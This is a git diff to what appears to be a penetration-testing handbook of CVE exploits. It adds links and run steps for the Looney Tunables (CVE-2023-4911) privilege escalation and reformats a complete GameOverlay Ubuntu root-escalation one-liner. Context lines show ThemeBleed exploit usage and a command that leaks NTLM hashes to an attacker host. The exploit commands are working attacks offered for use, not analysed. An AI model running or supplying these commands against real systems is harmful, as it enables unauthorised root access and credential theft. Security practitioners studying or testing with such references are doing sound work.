@@ -27,6 +27,7 @@
 - [CVE-2023-23397: Microsoft Outlook (Click-to-Run) LPE (0-day) (PowerShell Implementation)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-23397-Microsoft-Outlook-Click-to-Run-LPE-0-day-PowerShell-Implementation)
 - [CVE-2023-32629, CVE-2023-2640: GameOverlay Ubuntu Kernel Exploit LPE (0-day)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-32629-CVE-2023-2640-GameOverlay-Ubuntu-Kernel-Exploit-LPE-0-day)
 - [CVE-2023-38146: ThemeBleed RCE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-38146-ThemeBleed-RCE)
+- [CVE-2023-4911: Looney Tunables LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-4911-Looney-Tunables-LPE)
 - [GodPotato LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#GodPotato-LPE)
 - [Juicy Potato LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#Juicy-Potato-LPE)
 - [JuicyPotatoNG LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#JuicyPotatoNG-LPE)
@@ -134,6 +135,7 @@
 | CVE-2023-36874 | Windows Error Reporting Service LPE (0-day) | https://github.com/Wh04m1001/CVE-2023-36874 |
 | CVE-2023-38146 | ThemeBleed RCE | https://github.com/gabe-k/themebleed |
 | CVE-2023-38831 | WinRAR Exploit (0-day) | https://github.com/b1tg/CVE-2023-38831-winrar-exploit |
+| CVE-2023-4911 | Looney Tunables LPE | https://github.com/RickdeJager/CVE-2023-4911 |
 | n/a | dompdf RCE (0-day) | https://github.com/positive-security/dompdf-rce |
 | n/a | dompdf XSS to RCE (0-day) | https://positive.security/blog/dompdf-rce |
 | n/a | StorSvc LPE | https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc |
@@ -1014,8 +1016,7 @@ PS C:\> Send-CalendarNTLMLeak -recipient "<EMAIL>" -remotefilepath "\\<LHOST>\<F
 - Linux ubuntu2204 5.19.0-46-generic
 
 ```c
-$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
-setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
+$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
 ```
 
 ## CVE-2023-38146: ThemeBleed RCE
@@ -1119,6 +1120,25 @@ PS C:\> .\ThemeBleed.exe make_theme <LHOST> aero.theme
 
 ```c
 PS C:\> .\ThemeBleed.exe server
+```
+
+## CVE-2023-4911: Looney Tunables LPE
+
+> https://github.com/leesh3288/CVE-2023-4911
+
+```c
+$ python3 gen_libc.py 
+[*] '/lib/x86_64-linux-gnu/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+```
+
+```c
+$ gcc -o exp exp.c
+$ ./exp
 ```
 
 ## GodPotato LPE
